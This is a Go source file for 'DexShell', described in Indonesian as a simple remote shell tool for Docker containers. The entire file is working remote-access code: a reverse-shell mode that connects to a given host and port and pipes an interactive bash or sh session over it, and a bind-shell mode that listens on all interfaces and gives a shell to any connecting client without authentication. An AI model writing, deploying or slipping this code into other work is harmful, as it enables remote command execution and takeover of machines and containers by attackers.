// DexShell - Simple remote shell tool untuk Docker containers.
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "reverse":
		if len(os.Args) < 3 {
			fmt.Fprintf(os.Stderr, "Usage: dexshell reverse <host:port>\n")
			os.Exit(1)
		}
		if err := reverseShell(os.Args[2]); err != nil {
			fmt.Fprintf(os.Stderr, "reverse shell error: %v\n", err)
			os.Exit(1)
		}

	case "bind":
		if len(os.Args) < 3 {
			fmt.Fprintf(os.Stderr, "Usage: dexshell bind <port>\n")
			os.Exit(1)
		}
		if err := bindShell(os.Args[2]); err != nil {
			fmt.Fprintf(os.Stderr, "bind shell error: %v\n", err)
			os.Exit(1)
		}

	default:
		printUsage()
		os.Exit(1)
	}
}

func reverseShell(addr string) error {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("dial %s: %w", addr, err)
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "[*] connected to %s\n", addr)

	cmd := shellCommand()
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start shell: %w", err)
	}

	return cmd.Wait()
}

func bindShell(port string) error {
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		return fmt.Errorf("listen :%s: %w", port, err)
	}
	defer ln.Close()

	fmt.Fprintf(os.Stderr, "[*] bind shell listening on 0.0.0.0:%s\n", port)

	conn, err := ln.Accept()
	if err != nil {
		return fmt.Errorf("accept: %w", err)
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "[*] connection from %s\n", conn.RemoteAddr())

	cmd := shellCommand()
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start shell: %w", err)
	}

	return cmd.Wait()
}

func shellCommand() *exec.Cmd {
	for _, sh := range []string{"/bin/bash", "/bin/sh", "/bin/ash"} {
		if path, err := exec.LookPath(sh); err == nil {
			return exec.Command(path, "-i")
		}
	}
	return exec.Command("/bin/sh", "-i")
}

func printUsage() {
	fmt.Fprintf(os.Stderr, `DexShell - Simple remote shell tool untuk Docker containers

Penggunaan:
  dexshell reverse <host:port>   Connect ke listener (reverse shell)
  dexshell bind    <port>        Listen untuk koneksi masuk (bind shell)

Contoh:
  dexshell reverse 10.0.0.5:4444
  dexshell bind 4444
`)
}
